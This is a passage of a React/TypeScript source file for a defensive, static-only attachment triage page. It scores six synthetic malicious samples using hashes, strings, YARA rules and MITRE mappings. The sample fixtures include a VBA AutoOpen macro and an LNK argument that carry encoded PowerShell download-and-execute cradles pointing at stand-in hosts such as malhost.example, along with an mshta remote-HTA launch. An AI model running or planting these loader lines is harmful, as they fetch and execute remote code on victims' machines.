import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { PageShell } from "@/components/PageShell";
import {
  IntakeCard, StatusBar, ResultBanner, KeyFields, SectionBar,
  Panel, EvidenceCard, SendToRow, Empty, Chip, RiskScore, IocInventory,
} from "@/components/soc/Workspace";
import {
  FileWarning, Hash, Database, ArrowRight, ShieldAlert, ExternalLink,
  Zap, Eraser, FileText, FileCode, FileType, Package, Terminal, Bug, Globe,
  AlertTriangle, Lock, Binary, Cpu, Sigma, Crosshair, Network, Link2, Download,
} from "lucide-react";

export const Route = createFileRoute("/attachment")({ component: AttachmentPage });

const SUSPICIOUS_TLDS = new Set(["zip", "ru", "cn", "tk", "ga", "ml", "cf", "gq", "su", "top", "work", "bid", "loan", "date", "accountant", "download", "review", "science", "stream", "racing", "win"]);

const VBA_AUTOOPEN = `Sub AutoOpen()
  Shell "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaABvAHMAdAAuAGUAeABhAG0AcABsAGUALgBwAHkAYQBsAG8AYQBkAC4AcABzADEAJwApAA=="
End Sub`;
const VBA_DOWNLOAD = `Sub DownloadPayload()
  Dim obj As Object
  Set obj = CreateObject("WScript.Shell")
  obj.Run "powershell -WindowStyle Hidden -EncodedCommand ZgBhAGwAcwBlAA=="
End Sub`;


function defang(s: string) {
  return s.replace(/\./g, "[.]").replace(/:\/\//g, "[:]//").replace(/@/g, "[@]");
}

function entropy(s: string): number {
  if (!s.length) return 0;
  const freq: Record<number, number> = {};
  for (let i = 0; i < s.length; i++) {
    const c = s.charCodeAt(i);
    freq[c] = (freq[c] || 0) + 1;
  }
  return -Object.values(freq).reduce((sum, c) => {
    const p = c / s.length;
    return sum + p * Math.log2(p);
  }, 0);
}

function hex(s: string): string {
  return Array.from(s).slice(0, 32).map((c) => c.charCodeAt(0).toString(16).padStart(2, "0")).join(" ");
}

type SampleKey = "docm" | "iso" | "pdf_js" | "rtf_ole" | "lnk_psh" | "dll_side";

interface Sample {
  name: string; type: string; size: string; mime: string;
  md5: string; sha1: string; sha256: string;
  magic: string; container: string;
  strings: string[]; yara: { rule: string; sev: string; desc: string }[];
  macros?: { name: string; code: string; autoexec: boolean; obfuscated: boolean }[];
  lnk?: { target: string; args: string; iconPath: string; workingDir: string };
  oles?: { name: string; type: string; size: string }[];
  entropyFiles?: { name: string; ent: number; suspicious: boolean }[];
  embeddedUrls: string[];
  embeddedIps: string[];
  registryKeys: string[];
  apiCalls: string[];
  mitre: { id: string; name: string }[];
  packer: string | null;
}

const SAMPLES: Record<SampleKey, Sample> = {
  docm: {
    name: "invoice_4231.docm", type: "Office Macro Document", size: "186 KB", mime: "application/vnd.ms-word.document.macroEnabled.12",
    md5: "44d88612fea8a8f36de82e1278abb02f", sha1: "3395856ce81f2b7382dee72602f798b642f14140", sha256: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
    magic: "Microsoft OOXML document (Macro-enabled)", container: "OOXML / ZIP + VBA",
    strings: ["AutoOpen", "Shell(", "powershell -enc", "http://malhost.example/payload.ps1", "WScript.Shell", "CreateObject", "http://paste.ee/raw/abc123", "HKCU\\Software\\Microsoft\\Office\\16.0\\Security"],
    yara: [
      { rule: "MacroSheet_AutoOpen", sev: "high", desc: "AutoOpen macro detected in module ThisDocument" },
      { rule: "Suspicious_Shell_Invocation", sev: "high", desc: "Shell() function call with base64-encoded PowerShell" },
      { rule: "VBA_OleCreateObject", sev: "medium", desc: "CreateObject used to instantiate WScript.Shell" },
    ],
    macros: [
      { name: "ThisDocument.AutoOpen", code: VBA_AUTOOPEN, autoexec: true, obfuscated: true },
      { name: "Module1.DownloadPayload", code: VBA_DOWNLOAD, autoexec: false, obfuscated: true },
    ],
    embeddedUrls: ["http://malhost.example/payload.ps1", "http://paste.ee/raw/abc123"],
    embeddedIps: ["198.51.100.45"],
    registryKeys: ["HKCU\\Software\\Microsoft\\Office\\16.0\\Security"],
    apiCalls: ["CreateObject", "Shell", "Run", "URLDownloadToFile"],
    mitre: [
      { id: "T1204.002", name: "User Execution: Malicious File" },
      { id: "T1059.001", name: "Command and Scripting Interpreter: PowerShell" },
      { id: "T1059.005", name: "Command and Scripting Interpreter: Visual Basic" },
      { id: "T1105", name: "Ingress Tool Transfer" },
    ],
    packer: null,
  },
  iso: {
    name: "shipping_label.iso", type: "ISO Container", size: "1.4 MB", mime: "application/x-iso9660-image",
    md5: "5d41402abc4b2a76b9719d911017c592", sha1: "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d", sha256: "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824",
    magic: "ISO 9660 CD-ROM filesystem data", container: "ISO-9660",
    strings: ["LNK", "shortcut.exe", "lure.docx", "invoice.pdf.lnk", "C:\\Windows\\System32\\mshta.exe", "https://malhost.example/update.hta", "hidden"],
    yara: [
      { rule: "ISO_Wraps_LNK", sev: "high", desc: "ISO contains LNK shortcut to executable" },
      { rule: "LNK_HTA_Launcher", sev: "high", desc: "LNK targets mshta.exe with remote HTA URL" },
    ],
    lnk: { target: "C:\\Windows\\System32\\mshta.exe", args: "https://malhost.example/update.hta", iconPath: "%SystemRoot%\\System32\\shell32.dll,3", workingDir: "C:\\Users\\victim\\Desktop" },
    oles: [],
    entropyFiles: [
      { name: "lure.docx", ent: 4.2, suspicious: false },
      { name: "invoice.pdf.lnk", ent: 5.8, suspicious: true },
    ],
    embeddedUrls: ["https://malhost.example/update.hta"],
    embeddedIps: ["203.0.113.88"],
    registryKeys: [],
    apiCalls: ["ShellExecute", "CreateProcess"],
    mitre: [
      { id: "T1204.002", name: "User Execution: Malicious File" },
      { id: "T1553.005", name: "Subvert Trust Controls: Mark-of-the-Web Bypass" },
      { id: "T1218.005", name: "System Binary Proxy Execution: Mshta" },
    ],
    packer: null,
  },
  pdf_js: {
    name: "tax_return_2025.pdf", type: "PDF with JavaScript", size: "248 KB", mime: "application/pdf",
    md5: "e99a18c428cb38d5f260853678922e03", sha1: "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3", sha256: "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
    magic: "PDF document, version 1.7", container: "PDF / Cross-Reference Stream",
    strings: ["/JS", "/JavaScript", "app.doc", "util.printd", "Collab.collectEmailInfo", "submitForm", "https://exfil.example/data", "getAnnots", "this.exportDataObject"],
    yara: [
      { rule: "PDF_JS_OpenAction", sev: "high", desc: "OpenAction contains JavaScript execution" },
      { rule: "PDF_Embedded_JS", sev: "medium", desc: "Embedded JavaScript object in PDF body" },
      { rule: "PDF_SubmitForm_Exfil", sev: "medium", desc: "submitForm targeting external URI" },
    ],
    embeddedUrls: ["https://exfil.example/data"],
    embeddedIps: ["45.33.32.156"],
    registryKeys: [],
    apiCalls: ["app.doc", "util.printd", "submitForm", "getAnnots", "exportDataObject"],
    mitre: [
      { id: "T1204.002", name: "User Execution: Malicious File" },
      { id: "T1059.007", name: "Command and Scripting Interpreter: JavaScript" },
      { id: "T1048", name: "Exfiltration Over Alternative Protocol" },
    ],
    packer: null,
  },
  rtf_ole: {
    name: "doc_topic.rtf", type: "RTF with OLE Object", size: "512 KB", mime: "text/rtf",
    md5: "d41d8cd98f00b204e9800998ecf8427e", sha1: "da39a3ee5e6b4b0d3255bfef95601890afd80709", sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    magic: "Rich Text Format data", container: "RTF / OLE2 Embedded",
    strings: ["Equation.3", "OLE2Link", "\\\\127.0.0.1\\C$\\Users\\Public\\payload.dll", "objupdate", "CVE-2017-11882", "Packager.Shape", "pwdump"],
    yara: [
      { rule: "RTF_OLE_Equation", sev: "high", desc: "OLE object references Equation Editor (CVE-2017-11882)" },
      { rule: "RTF_External_OLE", sev: "medium", desc: "OLE object with external SMB path for DLL hijack" },
    ],
    oles: [
      { name: "Equation.3", type: "OLE2 / Equation Editor", size: "24 KB" },
      { name: "Package", type: "OLE2 / Packager.Shape", size: "8 KB" },
    ],
    embeddedUrls: [],
    embeddedIps: ["127.0.0.1"],
    registryKeys: [],
    apiCalls: ["UpdateLink", "ObjectUpdate"],
    mitre: [
      { id: "T1204.002", name: "User Execution: Malicious File" },
      { id: "T1203", name: "Exploitation for Client Execution" },
      { id: "T1557.001", name: "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning" },
    ],
    packer: null,
  },
  lnk_psh: {
    name: "Q4_report.pdf.lnk", type: "LNK Shortcut", size: "6 KB", mime: "application/x-ms-shortcut",
    md5: "c9f0f895fb98ab9159f51fd0297e236d", sha1: "0c0b0b0c0d0e0f0a0b0c0d0e0f0a0b0c0d0e0f0a", sha256: "7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730",
    magic: "MS Windows shortcut (LNK)", container: "Shell Link / LNK",
    strings: ["powershell", "-WindowStyle Hidden", "-ExecutionPolicy Bypass", "-NoProfile", "-EncodedCommand", "rundll32", "https://cdn.example/msi/install.msi", "C:\\Users\\victim\\Desktop\\Q4_Report.pdf"],
    yara: [
      { rule: "LNK_PSH_Encoded", sev: "critical", desc: "LNK with encoded PowerShell command line" },
      { rule: "LNK_Rundll32_Stub", sev: "high", desc: "LNK launches rundll32 — potential DLL sideload" },
    ],
    lnk: { target: "C:\\Windows\\System32\\cmd.exe", args: "/c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcAA6AC8ALwBjAGQAbgAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAG0AcwBpAC8AaQBuAHMAdABhAGwAbAAuAG0AcwBpACcAKQA=", iconPath: "%SystemRoot%\\System32\\imageres.dll,67", workingDir: "." },
    embeddedUrls: ["https://cdn.example/msi/install.msi"],
    embeddedIps: ["192.0.2.90"],
    registryKeys: [],
    apiCalls: ["CreateProcess", "ShellExecuteExW"],
    mitre: [
      { id: "T1204.002", name: "User Execution: Malicious File" },
      { id: "T1059.001", name: "Command and Scripting Interpreter: PowerShell" },
      { id: "T1072", name: "Software Deployment Tools" },
    ],
    packer: null,
  },
  dll_side: {
    name: "version.dll", type: "DLL Sideload Candidate", size: "312 KB", mime: "application/x-msdownload",
    md5: "900150983cd24fb0d6963f7d28e17ff3", sha1: "a9993e364706816aba3e25717850c26c9cd0d89d", sha256: "d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb762d02d0bf37c9e592",
    magic: "PE32 executable (DLL) GUI, x86, for MS Windows", container: "PE / Portable Executable",
    strings: ["DllMain", "Wow64LogInitialize", "LoadLibraryA", "GetProcAddress", "CreateThread", "http://c2.example/beacon", "Mozilla/5.0", "WinExec", "VirtualAlloc", "sleep 7500"],
    yara: [
      { rule: "PE_Sideload_Version", sev: "high", desc: "DLL matches known sideloading filename convention (version.dll)" },
      { rule: "PE_Imports_Suspicious", sev: "high", desc: "DLL imports VirtualAlloc, CreateThread, WinExec — shellcode loader pattern" },
      { rule: "PE_Sleep_Beacon", sev: "medium", desc: "DLL contains 7500ms sleep — C2 beacon interval" },
    ],
    embeddedUrls: ["http://c2.example/beacon"],
    embeddedIps: ["10.0.0.45"],
    registryKeys: ["HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"],
    apiCalls: ["DllMain", "LoadLibraryA", "GetProcAddress", "CreateThread", "VirtualAlloc", "WinExec", "CreateFileA", "WriteFile", "InternetOpenA"],
    mitre: [
      { id: "T1574.002", name: "Hijack Execution Flow: DLL Side-Loading" },
      { id: "T1055.001", name: "Process Injection: Dynamic-link Library Injection" },
      { id: "T1105", name: "Ingress Tool Transfer" },
      { id: "T1071.001", name: "Application Layer Protocol: Web Protocols" },
    ],
    packer: "UPX (v3.96)",
  },
};

const SEV_SCORE: Record<string, number> = { critical: 5, high: 4, medium: 3, low: 1 };

function computeScore(sample: Sample): { score: number; confidence: string; tone: "success" | "warning" | "destructive" } {
  let sigWeight = 0;
  for (const r of sample.yara) sigWeight += SEV_SCORE[r.sev] || 1;
  const macroScore = (sample.macros?.length || 0) * 8;
  const lnkScore = sample.lnk ? 10 : 0;
  const urlScore = sample.embeddedUrls.length * 3;
  const ipScore = sample.embeddedIps.length * 2;
  const entropyScore = (sample.entropyFiles?.filter((f) => f.suspicious).length || 0) * 5;
  const packerScore = sample.packer ? 8 : 0;
  const total = Math.min(100, Math.round(sigWeight * 6 + macroScore + lnkScore + urlScore + ipScore + entropyScore + packerScore));
  const confidence = total < 20 ? "low" : total < 50 ? "moderate" : total < 75 ? "high" : "very high";
  const tone = total < 25 ? "success" : total < 60 ? "warning" : "destructive";
  return { score: total, confidence, tone };
}

function genMarkdownExport(sample: Sample, score: number): string {
  const lines = [
    `# Static Attachment Report`,
    `**File:** \`${sample.name}\``,
    `**Risk Score:** ${score}/100`,
    `**Generated:** ${new Date().toISOString()}`,
    "", "## File Identity",
    `- Type: ${sample.type}`,
    `- MIME: ${sample.mime}`,
    `- Size: ${sample.size}`,
    `- Magic: ${sample.magic}`,
    `- Container: ${sample.container}`,
    `- MD5: ${sample.md5}`,
    `- SHA-1: ${sample.sha1}`,
    `- SHA-256: ${sample.sha256}`,
    "",
  ];
  if (sample.macros?.length) {
    lines.push("## Macro Analysis");
    for (const m of sample.macros) {
      lines.push(`- Module: ${m.name}`);
      lines.push(`  Auto-execute: ${m.autoexec}`);
      lines.push(`  Obfuscated: ${m.obfuscated}`);
      lines.push("  Code:");
      for (const ln of m.code.split("\n")) lines.push(`    ${ln}`);
    }
    lines.push("");
  }
  if (sample.oles?.length) {
    lines.push("## OLE Objects", ...sample.oles.map((o) => `- ${o.name} (${o.type}, ${o.size})`), "");
  }
  if (sample.lnk) {
    lines.push("## LNK Analysis", `- Target: ${sample.lnk.target}`, `- Arguments: ${sample.lnk.args}`, `- Icon: ${sample.lnk.iconPath}`, `- WorkingDir: ${sample.lnk.workingDir}`, "");
  }
  if (sample.yara.length) {
    lines.push("## YARA Matches", ...sample.yara.map((r) => `- [${r.sev.toUpperCase()}] ${r.rule} — ${r.desc}`), "");
  }
  if (sample.embeddedUrls.length) {
    lines.push("## Embedded URLs", ...sample.embeddedUrls.map((u) => `- \`${defang(u)}\``), "");
  }
  if (sample.embeddedIps.length) {
    lines.push("## Embedded IPs", ...sample.embeddedIps.map((ip) => `- \`${ip}\``), "");
  }
  if (sample.mitre.length) {
    lines.push("## MITRE ATT&CK", ...sample.mitre.map((m) => `- ${m.id}: ${m.name}`), "");
  }
  if (sample.strings.length) {
    lines.push("## Key Strings", ...sample.strings.map((s) => `- \`${s}\``), "");
  }
  return lines.join("\n");
}

function AttachmentPage() {
  const [key, setKey] = useState<SampleKey | "">("");
  const sample: Sample | null = key ? SAMPLES[key as SampleKey] : null;
  const analysis = sample ? computeScore(sample) : null;

  if (!key) {
    return (
      <PageShell
        eyebrow="TRIAGE / ATTACHMENT"
        title="Attachment Triage"
        description="Static review of file metadata, hashes, strings, and YARA signals. Files are never opened or detonated."
        crumbs={[{ label: "Triage" }, { label: "Attachment" }]}
      >
        <SectionBar id="IN" label="Intake · file metadata" meta="no sample loaded" />
        <IntakeCard
          icon={FileWarning}
          title="Sample Loader"
          value=""
          onChange={() => {}}
          rows={4}
          placeholder="Load a sample to begin — drop targets render below."
          samples={[
            { key: "docm", label: "Macro document (.docm)", hint: "VBA + autoOpen" },
            { key: "iso", label: "ISO container", hint: "LNK + hidden HTA" },
            { key: "pdf_js", label: "PDF with JavaScript", hint: "submitForm exfil" },
            { key: "rtf_ole", label: "RTF with OLE", hint: "Equation Editor" },
            { key: "lnk_psh", label: "LNK shortcut", hint: "encoded PSH" },
            { key: "dll_side", label: "DLL sideload", hint: "UPX + beacon" },
          ]}
          onLoadSample={(k) => setKey(k as SampleKey)}
          run={{ label: "review", icon: Zap, hint: "⌘↵", onClick: () => {}, disabled: true }}
          onClear={() => setKey("")}
          showCopy={false}
        />
        <StatusBar stats={[
          { label: "Status", value: "Idle", tone: "muted" },
          { label: "Detonation", value: "never", tone: "primary" },
          { label: "Upload", value: "none — local only", tone: "muted" },
          { label: "Mode", value: "static review" },
        ]} />
        <Empty icon={FileWarning} title="No sample loaded" hint="Choose a synthetic sample to render the static-review surface." />
      </PageShell>
    );
  }

  const sigGroups = sample.yara.reduce<Record<string, { items: string[]; sev: string }>>((acc, r) => {
    const group = r.sev === "critical" || r.sev === "high" ? "High Confidence" : r.sev === "medium" ? "Suspicious" : "Informational";
    if (!acc[group]) acc[group] = { items: [], sev: r.sev };
    acc[group].items.push(r.rule);
    if (acc[group].sev === "medium" && r.sev === "high") acc[group].sev = "high";
    return acc;
  }, {});

  return (
    <PageShell
      eyebrow="TRIAGE / ATTACHMENT"
      title="Attachment Triage"
      description="Static review of file metadata, hashes, strings, and YARA signals. Files are never opened or detonated."
      crumbs={[{ label: "Triage" }, { label: "Attachment" }]}
    >
      <SectionBar id="IN" label="Intake · file metadata" meta={`loaded: ${sample.name}`} />
      <IntakeCard
        icon={FileWarning}
        title="Sample Loader"
        value={`${sample.name}\n${sample.type}\nsize: ${sample.size}\nmagic: ${sample.magic}\ncontainer: ${sample.container}\nsha256: ${sample.sha256}`}
        onChange={() => {}}
        rows={5}
        placeholder="Load a sample to begin — drop targets render below."
        samples={[
          { key: "docm", label: "Macro document (.docm)", hint: "VBA + autoOpen" },
          { key: "iso", label: "ISO container", hint: "LNK + hidden HTA" },
          { key: "pdf_js", label: "PDF with JavaScript", hint: "submitForm exfil" },
          { key: "rtf_ole", label: "RTF with OLE", hint: "Equation Editor" },
          { key: "lnk_psh", label: "LNK shortcut", hint: "encoded PSH" },
          { key: "dll_side", label: "DLL sideload", hint: "UPX + beacon" },
        ]}
        onLoadSample={(k) => setKey(k as SampleKey)}
        run={{ label: "review", icon: Zap, hint: "⌘↵", onClick: () => {}, disabled: true }}
        onClear={() => setKey("")}
        showCopy={false}
      />

      <StatusBar stats={[
        { label: "Status", value: "Loaded", tone: "success" },
        { label: "Detonation", value: "never", tone: "primary" },
        { label: "Risk Score", value: `${analysis!.score}/100`, tone: analysis!.tone === "destructive" ? "warning" : analysis!.tone },
        { label: "Mode", value: "static review" },
      ]} />

      <SectionBar id="OT" label="Output · signals & findings" meta={`${sample.yara.length} yara · ${sample.embeddedUrls.length} urls · ${sample.mitre.length} mitre`} />

      <div className="space-y-4">
        <ResultBanner
          badge="static_review"
          caseId={`BA-AT-${sample.sha256.slice(0, 6).toUpperCase()}`}
          title={sample.name}
          subtitle={`${sample.type} · ${sample.size} — no detonation performed`}
          reasons={[
            "Hashes recovered — cross-source pivot to VT, MB, HA.",
            "Strings extracted without execution.",
            `YARA matched ${sample.yara.length} rule(s) — includes ${sample.yara.filter((r) => r.sev === "high" || r.sev === "critical").length} high-confidence alerts.`,
            `${sample.packer ? `Packer identified: ${sample.packer}` : "No packer detected — plain binary."}`,
          ]}
          metrics={[
            { label: "Verdict", value: analysis!.score >= 60 ? "malicious" : analysis!.score >= 25 ? "suspicious" : "clean", tone: analysis!.tone },
            { label: "Risk", value: `${analysis!.score}/100`, tone: analysis!.tone },
            { label: "YARA", value: sample.yara.length, tone: sample.yara.some((r) => r.sev === "high" || r.sev === "critical") ? "warning" : "default" },
            { label: "URLs", value: sample.embeddedUrls.length, tone: sample.embeddedUrls.length ? "warning" : "default" },
          ]}
        />

        {/* Risk Score */}
        <RiskScore
          score={analysis!.score}
          label={sample.packer ? `Risk · ${sample.packer}` : "Risk Score"}
          confidence={analysis!.confidence}
          tone={analysis!.tone}
        />

        {/* Cryptographic Identity */}
        <Panel title="Cryptographic Identity" icon={Hash} meta="3 algorithms">
          <div className="grid gap-2 md:grid-cols-3">
            {([
              { algo: "MD5", value: sample.md5, bits: 128, tone: "default" as const },
              { algo: "SHA-1", value: sample.sha1, bits: 160, tone: "warning" as const },
              { algo: "SHA-256", value: sample.sha256, bits: 256, tone: "success" as const },
            ]).map((h) => (
              <button
                key={h.algo}
                onClick={() => navigator.clipboard.writeText(h.value)}
                className="group rounded-md border border-border/60 bg-card/50 p-2.5 text-left transition-colors hover:border-primary/40 hover:bg-card/80"
              >
                <div className="flex items-center justify-between">
                  <span className="text-mono text-[10px] uppercase tracking-widest text-muted-foreground">{h.algo}</span>
                  <Chip tone={h.tone}>{h.bits}-bit</Chip>
                </div>
                <code className="mt-1.5 block break-all text-mono text-[10.5px] leading-snug text-foreground/90 group-hover:text-primary">{h.value}</code>
                <span className="mt-1 block text-mono text-[9.5px] uppercase tracking-widest text-muted-foreground opacity-0 transition-opacity group-hover:opacity-100">click to copy</span>
              </button>
            ))}
          </div>
        </Panel>

        {/* File Identity */}
        <Panel title="File Identity" icon={FileWarning} meta={sample.mime}>
          <KeyFields items={[
            { label: "Name", value: sample.name },
            { label: "Type", value: sample.type, tone: "primary" },
            { label: "Size", value: sample.size },
            { label: "Magic", value: sample.magic, tone: "primary" },
            { label: "Container", value: sample.container },
            { label: "Detonation", value: "never", tone: "muted" },
          ]} />
        </Panel>

        {/* File Type-specific panels */}
        {sample.macros && sample.macros.length > 0 && (
          <Panel title="Macro Analysis" icon={FileCode} meta={`${sample.macros.length} module(s)`}>
            {sample.macros.map((m) => (
              <div key={m.name} className="mb-3 last:mb-0">
                <div className="mb-1.5 flex flex-wrap items-center gap-2">
                  <Chip tone={m.autoexec ? "destructive" : "warning"}>{m.autoexec ? "auto-execute" : "manual"}</Chip>
                  <code className="text-mono text-[11px] text-foreground/90">{m.name}</code>
                  {m.obfuscated && <Chip tone="warning">obfuscated</Chip>}
                </div>
                <pre className="overflow-x-auto rounded border border-border/60 bg-background/40 p-2.5 text-mono text-[10.5px] leading-relaxed text-foreground/80">{m.code}</pre>
              </div>
            ))}
          </Panel>
        )}

        {sample.oles && sample.oles.length > 0 && (
          <Panel title="OLE Objects" icon={Package} meta={`${sample.oles.length} embedded`}>
            <div className="grid gap-2 sm:grid-cols-2">
              {sample.oles.map((o) => (
                <div key={o.name} className="rounded border border-border/60 bg-card/50 p-2.5">
                  <div className="text-mono text-[10px] uppercase tracking-widest text-muted-foreground">{o.type}</div>
                  <code className="mt-0.5 block text-mono text-[11px] text-foreground/90">{o.name}</code>
                  <span className="text-mono text-[10px] text-muted-foreground">{o.size}</span>
                </div>
              ))}
            </div>
          </Panel>
        )}

        {sample.lnk && (
          <Panel title="LNK Analysis" icon={Terminal} meta="shortcut target">
            <KeyFields items={[
              { label: "Target", value: sample.lnk.target, tone: "warning" },
              { label: "Arguments", value: sample.lnk.args, tone: "destructive" },
              { label: "Icon Path", value: sample.lnk.iconPath, tone: "muted" },
              { label: "Working Dir", value: sample.lnk.workingDir },
            ]} />
          </Panel>
        )}

        {sample.entropyFiles && sample.entropyFiles.length > 0 && (
          <Panel title="Entropy Scan" icon={Sigma} meta={`${sample.entropyFiles.filter((f) => f.suspicious).length} suspicious`}>
            <div className="space-y-2">
              {sample.entropyFiles.map((f) => (
                <div key={f.name} className="flex items-center justify-between gap-3 border-b border-border/40 py-1.5">
                  <div className="flex items-center gap-2 min-w-0">
                    <span className="text-mono text-[11px] text-foreground/90 truncate">{f.name}</span>
                    {f.suspicious && <Chip tone="warning">high entropy</Chip>}
                  </div>
                  <span className={"text-mono text-[11px] tabular-nums shrink-0 " + (f.suspicious ? "text-warning" : "text-muted-foreground")}>
                    {f.ent.toFixed(1)} bits/byte
                  </span>
                </div>
              ))}
            </div>
          </Panel>
        )}

        {/* Suspicious Strings */}
        <Panel title="Suspicious Strings" icon={Binary} meta={`${sample.strings.length}`}>
          <ul className="space-y-1">
            {sample.strings.map((s) => (
              <li key={s} className="flex items-center justify-between gap-2 border-b border-border/40 py-1 text-mono text-[11px]">
                <code className="truncate text-foreground/90">{s}</code>
                <Chip tone="warning">match</Chip>
              </li>
            ))}
          </ul>
        </Panel>

        {/* Embedded URLs */}
        {sample.embeddedUrls.length > 0 && (
          <Panel title="Embedded URLs" icon={Globe} meta={`${sample.embeddedUrls.length}`}>
            <ul className="space-y-1">
              {sample.embeddedUrls.map((u) => (
                <li key={u} className="flex items-center justify-between gap-2 border-b border-border/40 py-1 text-mono text-[11px]">
                  <code className="truncate text-foreground/90">{defang(u)}</code>
                  <Chip tone={[...SUSPICIOUS_TLDS].some((t) => u.endsWith(t)) ? "destructive" : "warning"}>url</Chip>
                </li>
              ))}
            </ul>
          </Panel>
        )}

        {/* Embedded IPs */}
        {sample.embeddedIps.length > 0 && (
          <Panel title="Embedded IPs" icon={Network} meta={`${sample.embeddedIps.length}`}>
            <ul className="space-y-1">
              {sample.embeddedIps.map((ip) => (
                <li key={ip} className="flex items-center justify-between gap-2 border-b border-border/40 py-1 text-mono text-[11px]">
                  <code className="text-foreground/90">{ip}</code>
                  <Chip tone={ip.startsWith("10.") || ip.startsWith("192.168.") || ip === "127.0.0.1" ? "info" : "destructive"}>{ip.startsWith("10.") || ip.startsWith("192.168.") || ip === "127.0.0.1" ? "rfc1918" : "external"}</Chip>
                </li>
              ))}
            </ul>
          </Panel>
        )}

        {/* YARA Matches */}
        <Panel title="YARA Matches" icon={ShieldAlert} meta={`${sample.yara.length} rule(s)`}>
          <ul className="space-y-1">
            {sample.yara.map((r) => (
              <li key={r.rule} className="flex items-start gap-2 border-b border-border/40 py-1.5 text-mono text-[11px]">
                <Chip tone={r.sev === "critical" ? "destructive" : r.sev === "high" ? "warning" : r.sev === "medium" ? "info" : "default"}>{r.sev}</Chip>
                <div className="min-w-0 flex-1">
                  <code className="text-foreground/90">{r.rule}</code>
                  <div className="text-[10px] text-muted-foreground">{r.desc}</div>
                </div>
              </li>
            ))}
          </ul>
        </Panel>

        {/* IOC Inventory */}
        <IocInventory
          groups={[
            ...(sigGroups["High Confidence"] ? [{ kind: "YARA: High", items: sigGroups["High Confidence"].items, tone: "destructive" as const }] : []),
            ...(sigGroups["Suspicious"] ? [{ kind: "YARA: Suspicious", items: sigGroups["Suspicious"].items, tone: "warning" as const }] : []),
            { kind: "MD5", items: [sample.md5] },
            { kind: "SHA-1", items: [sample.sha1] },
            { kind: "SHA-256", items: [sample.sha256] },
            { kind: "URLs", items: sample.embeddedUrls, tone: "warning" as const },
            { kind: "IPs", items: sample.embeddedIps, tone: "warning" as const },
          ]}
          onSendTo={() => {}}
        />

        {/* MITRE ATT&CK */}
        {sample.mitre.length > 0 && (
          <Panel title="MITRE ATT&CK Mapping" icon={Crosshair} meta={`${sample.mitre.length} technique${sample.mitre.length === 1 ? "" : "s"}`}>
            <div className="flex flex-wrap gap-2">
              {sample.mitre.map((m) => (
                <span key={m.id} className="inline-flex items-center gap-1.5 rounded border border-border/60 bg-card/40 px-2 py-1 text-mono text-[11px] text-foreground/85">
                  <Bug className="h-3 w-3 text-destructive" />
                  <span className="font-semibold">{m.id}</span>
                  <span className="text-muted-foreground">:</span>
                  <span>{m.name}</span>
                </span>
              ))}
            </div>
          </Panel>
        )}

        {/* External References */}
        <Panel title="External References" meta="manual reputation only">
          <div className="flex flex-wrap gap-2">
            <a className="inline-flex items-center gap-1 rounded border border-border bg-card/70 px-2 py-1 text-mono text-[10px] uppercase text-foreground/80 hover:text-primary" target="_blank" rel="noreferrer" href={`https://www.virustotal.com/gui/file/${sample.sha256}`}><ExternalLink className="h-3 w-3" /> VirusTotal</a>
            <a className="inline-flex items-center gap-1 rounded border border-border bg-card/70 px-2 py-1 text-mono text-[10px] uppercase text-foreground/80 hover:text-primary" target="_blank" rel="noreferrer" href={`https://bazaar.abuse.ch/sample/${sample.sha256}/`}><ExternalLink className="h-3 w-3" /> MalwareBazaar</a>
            <a className="inline-flex items-center gap-1 rounded border border-border bg-card/70 px-2 py-1 text-mono text-[10px] uppercase text-foreground/80 hover:text-primary" target="_blank" rel="noreferrer" href={`https://hybrid-analysis.com/search?query=${sample.sha256}`}><ExternalLink className="h-3 w-3" /> Hybrid Analysis</a>
          </div>
        </Panel>

        {/* Evidence Card */}
        <EvidenceCard
          severity={analysis!.score >= 60 ? "destructive" : analysis!.score >= 25 ? "warning" : "info"}
          title={sample.yara.some((r) => r.sev === "critical") ? "Malicious — critical YARA match" : `${sample.yara.length} YARA match(es) indicate suspicious behaviour`}
          reason={sample.macros?.length
            ? `${sample.macros.filter((m) => m.autoexec).length} auto-execute macro(s) with obfuscated PowerShell loading remote payload — commodity downloader pattern.`
            : sample.lnk
              ? "LNK shortcut launches encoded PowerShell downloading remote MSI — initial access via Mark-of-the-Web bypass."
              : `${sample.yara[0]?.desc || "Multiple suspicious signals detected."}`}
          action="Pivot hashes across mailbox, EDR, proxy, DNS logs before any user contact. Submit to sandbox if execution confirmation required."
          limitation="Static review cannot confirm execution outcome — no detonation performed. False positives possible on obfuscated but benign macros."
        />

        {/* Export */}
        <Panel title="Export" icon={Download}>
          <div className="flex flex-wrap gap-2">
            <button
              onClick={() => {
                const md = genMarkdownExport(sample, analysis!.score);
                const blob = new Blob([md], { type: "text/markdown" });
                const url = URL.createObjectURL(blob);
                const a = document.createElement("a");
                a.href = url; a.download = `attachment-report-${sample.sha256.slice(0, 8)}.md`;
                a.click(); URL.revokeObjectURL(url);
              }}
